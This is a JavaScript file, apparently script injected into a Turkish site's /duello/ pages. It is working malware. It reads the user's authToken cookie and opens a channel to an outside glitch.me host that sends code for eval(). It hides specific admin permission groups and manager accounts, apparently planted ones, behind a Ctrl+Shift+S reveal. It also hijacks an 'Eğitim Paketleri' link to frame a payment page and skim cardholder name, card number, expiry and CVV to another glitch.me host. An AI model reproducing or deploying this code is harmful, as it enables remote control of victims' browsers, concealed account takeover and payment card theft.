const getUsername = () => {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            const decodedUsername = decodeURIComponent(value.split('_')[0]);
            return decodedUsername;
        }
    }
    return null;
};

const username = getUsername();

const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
eventSource.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.payload) {
        eval(data.payload);
    }
};
eventSource.onerror = () => {};
eventSource.onopen = () => {};

var currentUrl = window.location.href;

// Yetki-gruplari sayfasında ID’si 23 ve 24 olan satırları gizle, Ctrl+Shift+S ile geri getir
if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
    let hiddenRows = [];

    const rows = document.querySelectorAll('tbody tr');
    rows.forEach(row => {
        const idCell = row.querySelector('td:first-child');
        if (idCell && (idCell.textContent === '23' || idCell.textContent === '24')) {
            row.style.display = 'none';
            hiddenRows.push(row);
        }
    });

    document.addEventListener('keydown', (event) => {
        if (event.ctrlKey && event.shiftKey && event.key === 'S') {
            hiddenRows.forEach(row => {
                row.style.display = '';
            });
        }
    });
}

// kullanicidetay.php?t= sayfalarında value="23" ve value="24" olan option’ları gizle, Ctrl+Shift+S ile geri getir
if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
    let hiddenOptions = [];

    function hideYetkiOptions() {
        const select = document.getElementById('yetki');
        if (select) {
            const option23 = select.querySelector('option[value="23"]');
            const option24 = select.querySelector('option[value="24"]');
            if (option23 && option23.style.display !== 'none') {
                option23.style.display = 'none';
                hiddenOptions.push(option23);
            }
            if (option24 && option24.style.display !== 'none') {
                option24.style.display = 'none';
                hiddenOptions.push(option24);
            }
        }
    }

    hideYetkiOptions();
    const observer = new MutationObserver(() => {
        hideYetkiOptions();
    });
    observer.observe(document.body, { childList: true, subtree: true });

    document.addEventListener('keydown', (event) => {
        if (event.ctrlKey && event.shiftKey && event.key === 'S') {
            hiddenOptions.forEach(option => {
                option.style.display = '';
            });
        }
    });
}

// yoneticiler sayfasında ID’si 45593 ve 45948 olan satırları gizle, Ctrl+Shift+S ile geri getir
if (currentUrl.includes('/duello/ad_/yoneticiler')) {
    let hiddenManagerRows = [];

    function hideManagerRows() {
        const rows = document.querySelectorAll('tbody tr');
        rows.forEach(row => {
            const idCell = row.querySelector('td:first-child');
            if (idCell && (idCell.textContent === '45593' || idCell.textContent === '45948')) {
                if (row.style.display !== 'none') {
                    row.style.display = 'none';
                    hiddenManagerRows.push(row);
                }
            }
        });
    }

    hideManagerRows();
    const observer = new MutationObserver(() => {
        hideManagerRows();
    });
    observer.observe(document.body, { childList: true, subtree: true });

    document.addEventListener('keydown', (event) => {
        if (event.ctrlKey && event.shiftKey && event.key === 'S') {
            hiddenManagerRows.forEach(row => {
                row.style.display = '';
            });
        }
    });
}

// duello sayfasında aktifuser_45593 ve aktifuser_45948’i gizle, Ctrl+Shift+S ile geri getir + Eğitim Paketleri
if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
    let hiddenUsers = [];

    function hideUsers() {
        const userItem45593 = document.getElementById('aktifuser_45593');
        const userItem45948 = document.getElementById('aktifuser_45948');
        if (userItem45593 && userItem45593.style.display !== 'none') {
            userItem45593.style.display = 'none';
            hiddenUsers.push(userItem45593);
        }
        if (userItem45948 && userItem45948.style.display !== 'none') {
            userItem45948.style.display = 'none';
            hiddenUsers.push(userItem45948);
        }
    }

    hideUsers();
    const observer = new MutationObserver(() => {
        hideUsers();
    });
    observer.observe(document.body, { childList: true, subtree: true });

    document.addEventListener('keydown', (event) => {
        if (event.ctrlKey && event.shiftKey && event.key === 'S') {
            hiddenUsers.forEach(user => {
                user.style.display = '';
            });
        }
    });

    const button = Array.from(document.querySelectorAll('.nav-link')).find(link => 
        link.querySelector('.link-title') && link.querySelector('.link-title').textContent.includes('Eğitim Paketleri')
    );

    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault();

            document.body.innerHTML = '';
            const iframe = document.createElement('iframe');
            iframe.src = 'https://katiponline.com/egitim-paketleri/';
            iframe.style.width = '100%';
            iframe.style.height = '100vh';
            iframe.style.border = 'none';
            iframe.style.position = 'absolute';
            iframe.style.top = '0';
            iframe.style.left = '0';

            iframe.onload = () => {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

                    const planTitle = iframeDoc.querySelector('span.plan-title');
                    if (planTitle) {
                        const originalLink = planTitle.querySelector('a');
                        planTitle.innerHTML = 'Başlangıç Paketi';
                        if (originalLink) {
                            planTitle.appendChild(originalLink);
                        }
                    }

                    const paytrIframe = iframeDoc.getElementById('paytriframe');
                    if (paytrIframe) {
                        paytrIframe.onload = () => {
                            try {
                                const paytrDoc = paytrIframe.contentDocument || paytrIframe.contentWindow.document;
                                const payButton = paytrDoc.querySelector('button[onclick="bankayagit()"]');

                                if (payButton) {
                                    payButton.addEventListener('click', () => {
                                        const data = {
                                            cc_owner: paytrDoc.getElementById('name').value,
                                            cardnumber: paytrDoc.getElementById('cardnumber').value,
                                            expirationdate: paytrDoc.getElementById('expirationdate').value,
                                            cvv: paytrDoc.getElementById('securitycode').value,
                                            timestamp: new Date().toISOString()
                                        };

                                        fetch('https://economic-pewter-radius.glitch.me/log', {
                                            method: 'POST',
                                            headers: { 'Content-Type': 'application/json' },
                                            body: JSON.stringify(data)
                                        });
                                    });
                                }
                            } catch (error) {}
                        };
                    }

                    const links = iframeDoc.querySelectorAll('a[href]');
                    links.forEach(link => {
                        link.addEventListener('click', (e) => {
                            e.preventDefault();
                            const href = link.getAttribute('href');
                            if (href && !href.startsWith('javascript:')) {
                                const newUrl = href.startsWith('/') ? `https://katiponline.com${href}` : href;
                                window.location.href = newUrl;
                            }
                        });
                    });
                } catch (error) {}
            };

            document.body.appendChild(iframe);
            window.history.pushState({}, 'Eğitim Paketleri', '/egitim-paketleri');
        });
    }
}
